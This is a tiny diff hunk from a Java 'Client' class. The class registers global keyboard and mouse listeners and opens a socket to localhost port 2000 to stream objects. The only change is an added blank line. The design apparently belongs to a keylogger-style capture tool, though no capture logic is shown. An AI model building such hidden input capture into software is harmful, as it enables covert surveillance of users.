@@ -12,6 +12,7 @@ public class Client implements NativeKeyListener, NativeMouseInputListener, Nati
  private static FileWriter filewriter;
  private static BufferedWriter bufferedWriter;
  private static ObjectOutputStream objectOutputStream;
+
  public static void main(String[] args) throws NativeHookException, IOException {
  Socket socket = new Socket("localhost", 2000);
  objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
